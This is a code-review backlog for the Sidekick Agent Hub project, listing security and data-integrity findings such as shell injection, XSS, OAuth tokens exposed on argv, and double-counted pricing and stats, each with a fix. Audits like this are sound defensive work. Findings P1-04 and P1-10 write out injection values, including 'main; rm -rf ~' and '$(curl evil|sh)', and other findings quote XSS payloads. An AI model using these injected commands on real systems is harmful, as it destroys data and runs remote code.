# Phase 1 — Security & Data Integrity

> Part of the [Sidekick Agent Hub review backlog](./README.md). Read the README first for methodology, trust levels, conventions, and the working loop.

**Goal.** Close injection/XSS/secret-exposure holes, make persistence crash-safe, and stop stats/pricing from reporting wrong numbers. Highest blast radius: these corrupt data or expose the user, so they ship first.

**This phase:** 20 findings — 6 high, 10 medium, 4 low.

## Progress tracker

Update the Status box as you go: `[ ]` todo → `[~]` in progress → `[x]` done (or `[-]` if dropped after re-verification). Keep the one-line note current.

| ID | Sev | Trust | Location | Finding | Status |
| --- | --- | --- | --- | --- | --- |
| P1-01 | 🔴 | ✅ | `src/modelInfo.ts:200` | Pricing table missing dashed claude-opus-4-5 key; Opus 4.5 priced at 3x Opus 4 tier | `[x]` |
| P1-02 | 🔴 | ✅ | `parsers/codexParser.ts:890` | Codex cache tokens double-counted: input_tokens already contains cached_input_tokens | `[x]` |
| P1-03 | 🔴 | ✅ | `providers/DashboardViewProvider.ts:7546` | Timeline [more]/[less] expand injects raw session text into innerHTML (escaping defeated) | `[x]` |
| P1-04 | 🔴 | ✅ | `services/GitService.ts:440` | execGit/getDiff spawn git with shell:true, enabling shell injection via base branch | `[x]` |
| P1-05 | 🔴 | ✅ | `services/HistoricalDataService.ts:82` | Session totals double-counted into daily/monthly/all-time buckets on every re-attach + end | `[x]` |
| P1-06 | 🔴 | ✅ | `services/RetroactiveDataLoader.ts:435` | Retroactive import double-counts sessions already saved by live monitoring | `[x]` |
| P1-07 | 🟠 | ✅ | `src/credentialIO.ts:66` | macOS keychain write passes full OAuth token JSON on the security CLI argv | `[x]` |
| P1-08 | 🟠 | ✅ | `readers/plans.ts:187` | writePlans bypasses the atomic writer — plain writeFile can tear the plans store | `[x]` |
| P1-09 | 🟠 | ✅ | `report/htmlHelpers.ts:57` | simpleMarkdownToHtml renders javascript:/data: link URLs into HTML reports (XSS) | `[x]` |
| P1-10 | 🟠 | ✅ | `report/openBrowser.ts:12` | openInBrowser builds a shell string from the file path — command injection | `[x]` |
| P1-11 | 🟠 | ✅ | `writers/atomic.ts:13` | atomicWriteJson never fsyncs the temp file or directory before/after rename | `[x]` |
| P1-12 | 🟠 | ✅ | `writers/atomic.ts:45` | updateJsonStoreAtomic treats any read error as an empty store, destroying data on transient I/O failures | `[x]` |
| P1-13 | 🟠 | ✅ | `writers/atomic.ts:66` | Lock stealing race: slow update() loses its lock, and finally-block rm deletes the thief's lock | `[x]` |
| P1-14 | 🟠 | ⚠️ | `providers/DashboardViewProvider.ts:8921` | Plan steps, step error messages, and plan-history titles rendered into innerHTML unescaped | `[x]` |
| P1-15 | 🟠 | ⚠️ | `providers/DashboardViewProvider.ts:7295` | Third-party promoclock.co strings injected into webview innerHTML unescaped | `[x]` |
| P1-16 | 🟠 | ⚠️ | `services/PrDescriptionService.ts:195` | detectBaseBranch mangles slashed upstream branches (origin/feature/foo -> foo) | `[x]` |
| P1-17 | ⚪ | ✅ | `src/quotaSnapshots.ts:119` | quota-snapshots.json read-modify-write races across processes, losing snapshots | `[x]` |
| P1-18 | ⚪ | ✅ | `readers/tasks.ts:20` | Store readers crash with TypeError on schema-drifted JSON instead of tolerating it | `[x]` |
| P1-19 | ⚪ | 🟡 | `providers/KnowledgeNoteDecorationProvider.ts:118` | Knowledge note hover markdown is trusted, enabling command: links from note content | `[x]` |
| P1-20 | ⚪ | ⚠️ | `providers/DashboardViewProvider.ts:6360` | changelogData embedded with plain JSON.stringify instead of _safeJsonForScript | `[x]` |

---

## Findings

### P1-01 — Pricing table missing dashed claude-opus-4-5 key; Opus 4.5 priced at 3x Opus 4 tier

- **Location:** `sidekick-shared/src/modelInfo.ts:200`
- **Severity / category:** 🔴 high · bug
- **Trust:** ✅ confirmed (2 verifiers)
- **Status:** `[x]` complete

**Problem.** The table's own header comment says dashed keys are 'the real model-ID form' and that 'both are needed' because 'prefix matching cannot bridge the two'. Dashed+dotted pairs exist for opus 4-8/4.8, 4-7/4.7, 4-6/4.6 (and sonnet-4-5, haiku-4-5), but Opus 4.5 only has the dotted 'claude-opus-4.5' key. A real dashed ID like 'claude-opus-4-5-20251101' therefore longest-prefix matches 'claude-opus-4' — the pre-4.5 tier defined at inputCostPerMillion 15.0 / outputCostPerMillion 75.0 instead of 5.0 / 25.0 — so estimated session costs for Opus 4.5 are shown ~3x too high whenever the LiteLLM override map isn't hydrated (offline, first run before hydration, and always in browser/webview bundles, since browser.ts exports getModelPricing but hydration is Node-only).

**Evidence.**

```ts
'claude-opus-4.5': {
    inputCostPerMillion: 5.0, ...
  },
  // Opus 4.0 / 4.1 — pre-4.5 pricing tier
  'claude-opus-4': {
    inputCostPerMillion: 15.0,
    outputCostPerMillion: 75.0,
```

**Fix.** Add a 'claude-opus-4-5' entry mirroring 'claude-opus-4.5' (5.0/25.0/6.25/0.5), consistent with the existing claude-sonnet-4-5 / claude-haiku-4-5 dashed keys, and add a test asserting dashed and dotted spellings resolve to identical pricing for every Claude family/version in the table.

<details><summary>Verifier notes</summary>

- I read the full pricing table and lookup path in sidekick-shared/src/modelInfo.ts: the dashed 'claude-opus-4-5' key is genuinely absent while every sibling family/version has both spellings, and getModelPricing performs only exact/longest-prefix matching with no dash-dot normalization. I executed the lookup: getModelPricing('claude-opus-4-5-20251101') returns 15/75 (claude-opus-4 tier) versus 5/25 for the dotted spelling, exactly the 3x overestimate claimed. The hydration mask is real but scoped correctly — pricingCatalog is node-subpath-only so browser bundles never hydrate, and Node is exposed on first run before hydration; the only tiny nuance is that a stale disk cache covers most offline cases after the first successful hydration.
- Reproduced against the built library: getModelPricing('claude-opus-4-5-20251101') returns 15/75 (the claude-opus-4 pre-4.5 tier) while the dotted form returns 5/25 — exactly 3x, and the dashed form is Anthropic's real API ID that session JSONL records and EventAggregator passes verbatim into pricing (EventAggregator.ts:377/496/939, no dash/dot normalization in the lookup path). The unhydrated state is reachable: hydratePricingCatalog is fire-and-forget in both cli.ts:42 and extension.ts:193, returns source:'offline' with empty overrides on first run without network, is user-disableable via sidekick.pricing.hydrateFromLiteLLM, and is skipped entirely by CLI cache-only commands. All sibling versions (sonnet-4-5, haiku-4-5, opus-4-6/4-7/4-8) have the dashed key; opus 4.5 is the lone gap, contradicting the table's own comment that both spellings are needed.

</details>

**Verification:** `modelInfo.test.ts` checks every dashed/dotted Claude version pair, including dated Opus 4.5 IDs. Shared build and all 894 tests pass.

---

### P1-02 — Codex cache tokens double-counted: input_tokens already contains cached_input_tokens

- **Location:** `sidekick-shared/src/parsers/codexParser.ts:890`
- **Severity / category:** 🔴 high · bug
- **Trust:** ✅ confirmed (2 verifiers)
- **Status:** `[x]` complete

**Problem.** In Codex/OpenAI usage, cached_input_tokens is a subset of input_tokens — the provider's own computeContextSize comment (providers/codex.ts:1043-1046) states this. handleTokenCount maps the full input_tokens AND repeats the cached amount as cache_read_input_tokens. EventAggregator.accumulateUsage then feeds both to calculateCostWithPricing (modelInfo.ts:465-469), which charges inputTokens at the full input rate plus cacheReadTokens at the cache rate — billing every cached token twice — and token totals/breakdowns (input + cacheRead) overstate usage. With typical 80-90% cache hit rates on long Codex sessions, displayed cost and token counts are dramatically inflated versus Claude/OpenCode sessions.

**Evidence.**

```ts
const mappedUsage: MessageUsage | undefined = usage
      ? {
          input_tokens: usage.input_tokens || 0,
          output_tokens: usage.output_tokens || 0,
          cache_read_input_tokens: usage.cached_input_tokens || 0,
          cache_creation_input_tokens: 0,
```

**Fix.** Normalize to the Anthropic-style disjoint shape at the parser boundary: input_tokens: Math.max(0, (usage.input_tokens || 0) - (usage.cached_input_tokens || 0)), keeping cache_read_input_tokens as cached_input_tokens. Then CodexProvider.computeContextSize should become inputTokens + cacheReadTokens (and CodexReader's onTokenUsage callback in providers/codex.ts:504-509 needs the same subtraction). Also verify reasoning_output_tokens is not additionally re-billed since it is a subset of output_tokens.

<details><summary>Verifier notes</summary>

- The repo's own comment (providers/codex.ts:1042-1048) confirms Codex input_tokens includes cached_input_tokens, yet handleTokenCount (codexParser.ts:886-893) maps the full input_tokens plus cached_input_tokens as cache_read_input_tokens into the Anthropic-disjoint MessageUsage shape. EventAggregator.accumulateUsage (lines 922-957) provider-agnostically feeds both to calculateCostWithPricing (modelInfo.ts:462-471) and to token totals, with live gpt-5.x pricing entries, so cached tokens are charged at full input rate plus cache-read rate and counted twice in totals; grep confirms no compensating guard in sidekick-vscode or elsewhere. Only the context-size display is correct today, via the codex-specific computeContextSize override that depends on the inclusive mapping — exactly as the claim states.
- Verified end-to-end: codexParser.ts:886-893 maps full input_tokens plus cached_input_tokens as cache_read_input_tokens; EventAggregator.accumulateUsage feeds both to calculateCostWithPricing (modelInfo.ts:465-469) and token totals, with no downstream correction (CLI sums input+cacheRead in totals and cache-hit %). Reachability is proven with real rollout data from ~/.codex/sessions: token_count events show total_tokens = input_tokens + output_tokens with cached_input_tokens (up to 90% of input) contained inside input_tokens, and gpt-5 pricing entries exist so the cost path is live. The provider's own computeContextSize comment (providers/codex.ts:1043-1046) confirms the subset semantics the parser ignores.

</details>

**Verification:** `codexParser.test.ts` proves cached input is subtracted and clamped; `codex.test.ts` proves totals and context reconstruction. Shared and extension suites pass.

---

### P1-03 — Timeline [more]/[less] expand injects raw session text into innerHTML (escaping defeated)

- **Location:** `sidekick-vscode/src/providers/DashboardViewProvider.ts:7546`
- **Severity / category:** 🔴 high · bug
- **Trust:** ✅ confirmed (manual read)
- **Status:** `[x]` complete

**Problem.** renderFilteredTimeline stores assistant-response text in HTML attributes via escapeHtml: data-truncated="..." data-full="..." (line 7524). On click, the expand handler reads them back with getAttribute — which returns the DECODED original string (entities are decoded during HTML parsing) — and assigns it directly to innerHTML. So the escaping is fully round-tripped away. Failure scenario: an assistant response (LLM output, influenceable by repo/session content) containing '<img src=x onerror=...>' or even benign markup like '<T>' in code is parsed as raw HTML when the user clicks [more]: content silently disappears or arbitrary markup/spoofed UI is injected into the trusted dashboard (CSP blocks script execution but not markup/UI injection), and generic-type text in responses renders corrupted.

**Evidence.**

```ts
const full = descEl.getAttribute('data-full');
...
descEl.innerHTML = full + ' <span class="expand-link" data-idx="' + idx + '" data-expanded="true">[less]</span>';
```

**Fix.** Re-escape on write: descEl.innerHTML = escapeHtml(full) + ...  (and escapeHtml(truncated) on collapse), or better, set text via textContent and append the expand-link element with createElement instead of innerHTML.

**Verification:** `DashboardViewProvider.test.ts` asserts expand/collapse uses `textContent`/DOM nodes and contains no raw `innerHTML` reassignment sinks.

---

### P1-04 — execGit/getDiff spawn git with shell:true, enabling shell injection via base branch

- **Location:** `sidekick-vscode/src/services/GitService.ts:440`
- **Severity / category:** 🔴 high · bug
- **Trust:** ✅ confirmed (manual read)
- **Status:** `[x]` complete

**Problem.** All git invocations use spawn(..., { shell: true }), which joins args into a shell command WITHOUT escaping. execGit is called with a base-branch string interpolated into `${baseBranch}..HEAD` (getBranchCommits, GitService.ts:471-475) and `${baseBranch}...HEAD` (getBranchDiff, GitService.ts:500-503). That base branch comes from PrDescriptionService.detectBaseBranch, which takes free-form user input from vscode.window.showInputBox (PrDescriptionService.ts:201-206) or the upstream refname (git refnames may legally contain `$`, backticks, `;`, `&`, `(`, `)`). Failure scenario: user types `main; rm -rf ~` at the 'Compare with which base branch?' prompt (or a cloned repo has a crafted upstream branch name like `$(curl evil|sh)`) -> the shell executes the injected command with the user's privileges. shell:true is also entirely unnecessary here since spawn is given an argv array.

**Evidence.**

```ts
const gitProcess = spawn('git', args, { cwd: repoPath, shell: true });  // execGit — and in getDiff: `const gitProcess = spawn('git', args, { cwd, shell: true });`
```

**Fix.** Remove `shell: true` from both spawn calls in getDiff (line 275-278) and execGit (line 440); spawn('git', args, { cwd }) passes args verbatim with no shell interpretation. Optionally also validate the user-supplied base branch with `git check-ref-format --branch` before use.

**Verification:** `GitService.test.ts` verifies both diff and hostile ref arguments are passed to `spawn` literally with no shell option.

---

### P1-05 — Session totals double-counted into daily/monthly/all-time buckets on every re-attach + end

- **Location:** `sidekick-vscode/src/services/HistoricalDataService.ts:82`
- **Severity / category:** 🔴 high · bug
- **Trust:** ✅ confirmed (manual read)
- **Status:** `[x]` complete

**Problem.** saveSessionSummary() accumulates a summary's full token/cost totals into daily, hourly, monthly, and all-time buckets with no per-session idempotency (only the `sessions` array dedups by sessionId). SessionMonitor fires _onSessionEnd with FULL replayed totals every time a monitored session is replaced: attachToSession() does a full replay (or snapshot restore) so getSessionSummary() always returns the whole session's totals, and extension.ts:428-431 saves that on every end event. Concrete everyday scenario: session A ends while VS Code is open -> A's totals saved. User restarts VS Code; findActiveSession() (no age cutoff, sidekick-shared sessionPathResolver.ts:340-348 falls back to most-recent file) re-attaches to the already-counted session A; when the next session B starts, performNewSessionCheck fires end -> A's full totals are added to the buckets a second time. Same inflation occurs when manually switching between two sessions in the picker, or when OpenCode inactivity bounces sessions. Historical charts and all-time cost permanently over-report.

**Evidence.**

```ts
// Update daily data
    this.updateDailyData(date, summary);
...
    this.store.sessions = [
      ...(this.store.sessions ?? []).filter((session) => session.sessionId !== summary.sessionId),
      record,
    ].slice(-HISTORICAL_SESSION_RETENTION_LIMIT);
```

**Fix.** Make bucket accumulation idempotent per sessionId: either keep a persisted set/map of aggregated sessionIds (with the totals last credited, so a re-save can diff-and-adjust), or recompute daily/monthly/all-time buckets from the deduplicated `sessions` array on save. Alternatively, before accumulating, subtract the previously stored record for the same sessionId that the `sessions` filter is about to drop.

**Verification:** `HistoricalDataService.test.ts` saves the same session twice with changed totals and proves all aggregate/session counts equal the replacement only.

---

### P1-06 — Retroactive import double-counts sessions already saved by live monitoring

- **Location:** `sidekick-vscode/src/services/RetroactiveDataLoader.ts:435`
- **Severity / category:** 🔴 high · bug
- **Trust:** ✅ confirmed (manual read)
- **Status:** `[x]` complete

**Problem.** loadHistoricalData() skips only files in importedFiles. Sessions saved by the live path (extension.ts onSessionEnd -> saveSessionSummary) never call markFileImported, so running 'Sidekick: Import Historical Data' after any live-monitored sessions re-imports those same JSONL files and re-adds their tokens/cost to daily/monthly/all-time buckets (saveSessionSummary has no bucket-level dedup). The reverse also double-counts: auto-import on first activation (extension.ts:367-370) imports the currently-active session's partial file and marks it imported; when that live session later ends, its full summary (including the already-imported portion) is saved again. Marking an in-progress file as imported additionally freezes its retroactive record at partial content.

**Evidence.**

```ts
if (importedFiles.has(filePath)) {
        result.filesSkipped++;
        ...
      }
...
      this.historicalDataService.markFileImported(filePath);
```

**Fix.** Skip files whose session IDs already exist in historicalDataService.getSessionRecords() (or whose sessionId matches the currently monitored session), have the live save path call markFileImported(sessionPath) on session end, and skip files with mtime within the active-session threshold so in-progress sessions are not imported and frozen.

**Verification:** `RetroactiveDataLoader.test.ts` proves saved session IDs and active/recent JSONL files are skipped; live session end now marks its JSONL imported.

---

### P1-07 — macOS keychain write passes full OAuth token JSON on the security CLI argv

- **Location:** `sidekick-shared/src/credentialIO.ts:66`
- **Severity / category:** 🟠 medium · bug
- **Trust:** ✅ confirmed (2 verifiers)
- **Status:** `[x]` complete

**Problem.** writeActiveCredentials serializes the whole Claude credential blob (access token, refresh token) and passes it as the `-w` argument to `security add-generic-password`. Process arguments are visible in `ps`/Activity Monitor to other processes and other local users for the lifetime of the subprocess, so every account add/switch briefly publishes live OAuth tokens in the system process table. This runs on each switchToAccount, backupCurrentClaudeLiveHome, and login finalize.

**Evidence.**

```ts
execFileSync(
      'security',
      [
        'add-generic-password',
        '-U',
        '-s',
        claudeKeychainService(configDir),
        '-a',
        process.env.USER || 'user',
        '-w',
        json,
      ],
```

**Fix.** Use the security CLI's interactive mode to keep the secret off argv: execFileSync('security', ['-i'], { input: `add-generic-password -U -s "${service}" -a "${account}" -w '${escaped}'\n` }) — or a native keychain binding — so the token is passed via stdin instead of the process argument list.

<details><summary>Verifier notes</summary>

- Verified credentialIO.ts:66-79: on darwin, writeActiveCredentials passes the full serialized credential blob (OAuth access + refresh tokens) as the `-w` argv element of `security add-generic-password`, with no stdin/interactive alternative anywhere; the configDir parameter only changes the keychain service name, so every darwin write path uses argv. Callers check out: backupCurrentClaudeLiveHome (accounts.ts:182), switchToAccount (accounts.ts:428 plus rollback paths at 383/432/445), and accountManager.ts:174 in the login-finalize/canonical-home flow, so tokens hit the process table on every account add/switch/backup. I empirically confirmed the exposure premise on this macOS host: a non-root `ps aux` shows full argv of other users' (root's) processes, so argv is readable cross-user, and the subprocess can live up to the 4000ms timeout. The only mitigating nuance is that same-user attackers can already read the keychain item via `security find-generic-password` without a prompt, so the marginal exposure is mainly other local users and argv-capturing audit/EDR tooling — consistent with the claimed medium severity, not grounds to refute.
- Verified credentialIO.ts:65-79 passes the full credential JSON as the -w argv element to `security add-generic-password`, and traced reachable callers: switchToAccount (accounts.ts:339→383, 121-122), applyActiveClaudeToLiveHome (accounts.ts:407→428/432/445), and login finalize (accountManager.ts:174), all wired to the sidekick CLI account command and VS Code AccountService — so on macOS every account add/switch deterministically spawns `security` with live OAuth tokens in argv. However, the stated blast radius is overstated: macOS KERN_PROCARGS2 only exposes argv to same-uid processes and root (not other local users, unlike Linux /proc), and same-uid processes can already read the item promptlessly via `security find-generic-password` since /usr/bin/security is in the item ACL, leaving the marginal exposure at sandboxed same-uid processes, EDR/audit logs that persist argv, and the subprocess's millisecond lifetime.

</details>

**Verification:** `credentialIO.test.ts` asserts keychain writes use `security -i`, the token is absent from argv, and the payload is supplied through stdin.

---

### P1-08 — writePlans bypasses the atomic writer — plain writeFile can tear the plans store

- **Location:** `sidekick-shared/src/readers/plans.ts:187`
- **Severity / category:** 🟠 medium · bug
- **Trust:** ✅ confirmed (2 verifiers)
- **Status:** `[x]` complete

**Problem.** Every other store in this package goes through atomicWriteJson/updateJsonStoreAtomic, but writePlans does a direct fs.promises.writeFile. A crash mid-write, or a concurrent reader (readPlans in the live CLI dashboard, which calls writePlans at dashboard.ts:145 while other surfaces read the same file), can observe a truncated/half-written JSON file; readJsonStore then returns null and all plan history appears empty. It also does read-modify-write (callers read, merge, write) with no lock, so two writers can drop each other's plans.

**Evidence.**

```ts
const dir = filePath.replace(/[/\\][^/\\]+$/, '');
  await fs.promises.mkdir(dir, { recursive: true });

  await fs.promises.writeFile(filePath, JSON.stringify(store, null, 2), 'utf-8');
```

**Fix.** Replace the manual mkdir+writeFile with `await atomicWriteJson(filePath, store)` from writers/atomic.ts (which also fixes the hand-rolled dirname regex); if concurrent writers matter, restructure callers onto updateJsonStoreAtomic with a merge callback.

<details><summary>Verifier notes</summary>

- Verified plans.ts:187 uses plain fs.promises.writeFile while tasks/notes/decisions writers all use updateJsonStoreAtomic (lock + temp + rename), and readJsonStore returns null on malformed JSON so readPlans reports empty history on a torn read. The race is real and stronger than claimed: the VS Code extension's PlanPersistenceService writes the same ~/.config/sidekick/plans/{slug}.json via atomicWriteJsonSync/updateJsonStoreAtomic, but writePlans bypasses the .lock protocol, so the CLI's read-merge-write at dashboard.ts:122-145 (called repeatedly at lines 293/313/527/588) can silently drop extension-written plans and expose torn files to concurrent readers (StaticDataLoader.ts:65, the extension's loader). No guard, type constraint, or retry mitigates it.
- writePlans (plans.ts:187) is confirmed as the only store writer in sidekick-shared using plain writeFile while atomic.ts utilities exist and are used everywhere else — including by the VS Code extension writing the exact same plans file via updateJsonStoreAtomic, with code comments explicitly anticipating concurrent CLI writes. The failure is reachable: persistPlan runs in the CLI's SIGINT/SIGTERM cleanup handler with stores up to 50 plans of rawMarkdown (multi-chunk writes), so an interrupted exit leaves a truncated file; readJsonStore then returns null and the next persistPlan silently rewrites history with only the current plan — permanent data loss, no concurrency required. The unlocked read-modify-write at dashboard.ts:122/145 additionally allows two concurrent writers to drop each other's plans.

</details>

**Verification:** `plans.test.ts` asserts `writePlans` invokes the shared atomic writer and never calls plain `writeFile`.

---

### P1-09 — simpleMarkdownToHtml renders javascript:/data: link URLs into HTML reports (XSS)

- **Location:** `sidekick-shared/src/report/htmlHelpers.ts:57`
- **Severity / category:** 🟠 medium · bug
- **Trust:** ✅ confirmed (2 verifiers)
- **Status:** `[x]` complete

**Problem.** The markdown link rule puts the (HTML-escaped) URL straight into href. Escaping neutralizes quote breakout but not the URL scheme, so session content containing `[click](javascript:...)` — user/assistant text in the transcript, which can include text echoed from untrusted sources fetched during the session — becomes a clickable script link in the generated report, which openInBrowser then opens in the user's default browser. `data:text/html,...` URLs are equally accepted.

**Evidence.**

```ts
result = result.replace(
    /\[([^\]]+)\]\(([^)]+)\)/g,
    '<a href="$2" target="_blank" rel="noopener">$1</a>',
  );
```

**Fix.** Validate the scheme in the replace callback: only emit an <a> when the URL matches /^(https?:|mailto:|#|\/)/i (after trimming); otherwise render the raw `[text](url)` as plain text. Add a test with a javascript: and a data: link.

<details><summary>Verifier notes</summary>

- Verified in htmlHelpers.ts that escapeHtml runs first (line 37) and the link rule (lines 57-60) injects the URL into href with no scheme check; javascript:/data:/file: URLs contain no HTML-special characters so they survive escaping intact. Untrusted transcript text reaches this path (htmlReportGenerator.ts:625) and the report is opened via file:// in the default browser with no CSP or sanitizer; the repo's own handoffUrl.ts:27 blocklists exactly these schemes, confirming this is a recognized threat class in this codebase. The only overstatement: the emitted target="_blank" rel="noopener" means modern mainstream browsers refuse to execute javascript: URLs in the new noopener context and block top-frame data: navigation, so the click-to-execute exploit largely fails today — but file:// and custom protocol-handler links still go through, and the protection is incidental browser behavior, not a code guard.
- The injection is fully reachable: raw session JSONL text (attacker-influenceable via content echoed into the transcript) flows through parseTranscript into simpleMarkdownToHtml, and htmlHelpers.ts:57-60 emits the URL into href with no scheme check; sidekick report then opens the CSP-less file in the default browser. However, the claimed consequence overstates practical exploitability: every emitted anchor carries target="_blank" rel="noopener", and current Chrome/Firefox refuse to execute javascript: URLs targeting a new browsing context and block top-level data: navigation, so a plain click does not run script in mainstream browsers today; additionally the ([^)]+) capture truncates at the first ")", breaking naive payloads (percent-encoding bypasses that). A meaningful defect remains because safety rests entirely on an incidental browser quirk — without target="_blank" the script would run in the file:// report page with access to the whole transcript, the VS Code path is only saved by its separately injected CSP, and sidekick-shared exports this HTML to external consumers whose embedding contexts may not share the quirk.

</details>

**Verification:** `htmlReportGenerator.test.ts` proves `javascript:` and `data:` markdown links remain inert text while HTTPS links still render.

---

### P1-10 — openInBrowser builds a shell string from the file path — command injection

- **Location:** `sidekick-shared/src/report/openBrowser.ts:12`
- **Severity / category:** 🟠 medium · bug
- **Trust:** ✅ confirmed (2 verifiers)
- **Status:** `[x]` complete

**Problem.** The path is interpolated into a shell command executed via exec(). A path containing `"`, backticks, or `$(...)` breaks the quoting and executes arbitrary commands. This is a public npm API, and the CLI feeds it the user-supplied --output path (sidekick-cli/src/commands/report.ts: `openInBrowser(outFile)` where `outFile = outputPath || ...`), so e.g. `sidekick report --output '/tmp/$(rm -rf ~)x.html'` runs the embedded command on macOS/Linux. Paths with legitimate `$` or quote characters also simply fail to open.

**Evidence.**

```ts
const url = `file://${filePath}`;
  switch (process.platform) {
    case 'darwin':
      exec(`open "${url}"`);
```

**Fix.** Use execFile with an argument array instead of exec with string interpolation: execFile('open', [url]) on darwin, execFile('xdg-open', [url]) on Linux, and spawn('cmd', ['/c', 'start', '', url], { windowsVerbatimArguments: false }) (or rundll32 url.dll,FileProtocolHandler) on win32.

<details><summary>Verifier notes</summary>

- Verified openBrowser.ts lines 8-20: the path is interpolated into a shell string and run via exec() (which uses /bin/sh -c) on all three platforms, wrapped only in double quotes that do not neutralize backticks, $(...), or embedded quotes. No sanitization, validation, or type guard exists anywhere in the call chain. Confirmed the public-API claim (exported at index.ts:452) and the user-input flow: CLI registers --output (cli.ts:138), report.ts sets outFile = outputPath || temp (line 90) and calls openInBrowser(outFile) (line 96), so a user-supplied --output value reaches the shell unmodified — e.g. --output '/tmp/$(rm -rf ~)x.html' triggers command substitution. Medium severity is appropriate since exploitation requires a crafted invocation, but it is a genuine injection defect and the execFile/spawn fix is correct.
- Verified openBrowser.ts imports exec from child_process (which spawns /bin/sh -c), and line 12 interpolates the path into a double-quoted shell string; $(...), backticks, and $VAR are still expanded inside double quotes in sh/bash, so this is genuine command injection. The tainted path is reachable: cli.ts:138 exposes --output <path>, and report.ts flows opts.output → outFile → openInBrowser(outFile) with no sanitization; the earlier writeFileSync accepts the literal filename and does not block reaching the exec call. The reproduction sidekick report --output '/tmp/$(rm -rf ~)x.html' concretely triggers rm -rf ~ via command substitution. Caveat: for the CLI the input is the invoking user's own flag (self-injection), tempering attacker severity, but openInBrowser is a public sidekick-shared export and the special-character breakage is a real bug regardless, so a meaningful defect stands.

</details>

**Verification:** `openBrowser.test.ts` exercises hostile paths on macOS, Linux, and Windows and verifies argument-array `execFile` calls only.

---

### P1-11 — atomicWriteJson never fsyncs the temp file or directory before/after rename

- **Location:** `sidekick-shared/src/writers/atomic.ts:13`
- **Severity / category:** 🟠 medium · bug
- **Trust:** ✅ confirmed (2 verifiers)
- **Status:** `[x]` complete

**Problem.** The write-temp-then-rename pattern only protects against a crash between write and rename if the data is flushed before the rename is journaled. fs.promises.writeFile + rename issues no fsync on the file and none on the parent directory, so on power loss / OS crash ext4- and APFS-class filesystems can persist the rename while the data blocks are lost, leaving tasks/{slug}.json, decisions/{slug}.json, error-history.json etc. as a zero-length or truncated file — exactly the data loss the 'atomic' contract exists to prevent. (updateJsonStoreAtomic then silently 'recovers' the corrupt file as an empty store, making the loss permanent on the next write.)

**Evidence.**

```ts
await fs.promises.writeFile(tempPath, JSON.stringify(value, null, 2), {
      encoding: 'utf8',
      mode: 0o600,
    });
    await fs.promises.rename(tempPath, filePath);
```

**Fix.** Open the temp file with fs.promises.open, write, then await handle.sync() before close and rename; afterwards open the parent directory and fsync it (best-effort, ignore ENOSYS/EISDIR errors on platforms that disallow directory fsync, e.g. Windows). Mirror the same in atomicWriteJsonSync with fs.fsyncSync.

<details><summary>Verifier notes</summary>

- Verified in atomic.ts that neither atomicWriteJson nor atomicWriteJsonSync fsyncs the temp file or parent directory, a repo-wide grep confirms no fsync anywhere in the write paths, and updateJsonStoreAtomic (lines 43-47) silently replaces an unparseable store with createEmpty(), making any truncation permanent. However, the claim overstates the exposure: process crashes are fully safe without fsync (only power loss/kernel panic is at risk), default ext4/btrfs specifically flush data before committing replace-via-rename (auto_da_alloc), and the suggested fsync fix does not close the window on macOS/APFS without F_FULLFSYNC. A meaningful but narrower hardening defect remains, chiefly because the silent empty-store recovery turns any corruption into permanent invisible data loss.
- Verified the code has no fsync on file or directory in atomicWriteJson/atomicWriteJsonSync or the two duplicated copies, and no fsync anywhere else in the repo. The failing state is unreachable via process crashes (rename atomicity + page cache make those safe) and is specifically mitigated on default ext4/btrfs by the auto_da_alloc replace-via-rename flush heuristic, contradicting the claim's ext4 assertion — but on APFS (the project's primary platform) no data-before-rename ordering guarantee exists, the write window recurs on every error/stat/task save, and updateJsonStoreAtomic then permanently resets a truncated store to empty, so a genuine power-loss durability defect remains; ecosystem practice (write-file-atomic, VS Code) fsyncs by default.

</details>

**Verification:** `atomic.test.ts` instruments the built sync writer and proves both the file and containing directory are fsynced; async uses matching operations.

---

### P1-12 — updateJsonStoreAtomic treats any read error as an empty store, destroying data on transient I/O failures

- **Location:** `sidekick-shared/src/writers/atomic.ts:45`
- **Severity / category:** 🟠 medium · bug
- **Trust:** ✅ confirmed (2 verifiers)
- **Status:** `[x]` complete

**Problem.** The bare catch around readFile+JSON.parse conflates 'file does not exist' with EACCES, EMFILE, EIO and any other transient read failure. State: tasks store holds 50 tasks; a busy dashboard process hits EMFILE on readFile; addTask proceeds with createEmpty(), the update callback adds one task, and atomicWriteJson overwrites the file with a 1-task store — 50 tasks permanently lost. The same path silently wipes decisions, notes, and error-history stores.

**Evidence.**

```ts
let latest = createEmpty();
    try {
      latest = JSON.parse(await fs.promises.readFile(filePath, 'utf8')) as T;
    } catch {
      // Missing/malformed stores start from the schema-correct empty value.
    }
```

**Fix.** Read with an explicit error check: start from createEmpty() only when the readFile error code is ENOENT; rethrow other filesystem errors. For JSON.parse failures (genuine corruption), consider renaming the corrupt file to `${filePath}.corrupt-<ts>` before overwriting so the data remains recoverable.

<details><summary>Verifier notes</summary>

- The bare catch at atomic.ts:43-47 verifiably conflates ENOENT with EACCES/EMFILE/EIO and then line 49 unconditionally overwrites the store; CLI writers (tasks.ts:45,60, decisions.ts:54, notes.ts:52, errorHistory.ts:50) hold no in-memory copy, so a transient read failure permanently wipes all prior entries. I looked for refuting guards: acquireLock pre-filters directory-level errors (it opens the lock fd first and rethrows non-EEXIST), and the VS Code PersistenceService merges its in-memory store so it is largely protected — but file-level EACCES (e.g. root-owned store after a sudo run) and EMFILE at the readFile call still reach the fallback in the CLI writers with total data loss. The claim survives verification; the trigger is rare but the consequence is silent permanent data loss, so medium severity is fair.
- The code at atomic.ts:42-49 is exactly as quoted: a bare catch turns any readFile error into createEmpty(), and line 49 unconditionally overwrites the file, so a non-ENOENT read failure on an existing store silently destroys it. Callers confirm the consequence — addTask/completeTask/addDecision/addNote/errorHistory rebuild the store purely from the on-disk read with no in-memory copy and no backup, so a false-empty read loses all prior entries in cross-session user data (kanban tasks, decisions, notes). Reachability is rare but real: EACCES (root-owned file after a sudo run, in a user-owned dir where the rename still succeeds), ESTALE/EIO on NFS home dirs or failing disks, and EMFILE in the watcher-heavy CLI dashboard — though the EMFILE window is narrower than claimed because sustained fd exhaustion makes acquireLock's open fail first (which rethrows safely); readFile must fail after the lock open succeeded. The malformed-JSON→empty branch is explicitly intentional per the code comment, so only the error-code conflation is the defect.

</details>

**Verification:** `atomic.test.ts` injects `EIO` and proves it is rethrown without overwriting, and proves malformed JSON is retained as a corruption backup.

---

### P1-13 — Lock stealing race: slow update() loses its lock, and finally-block rm deletes the thief's lock

- **Location:** `sidekick-shared/src/writers/atomic.ts:66`
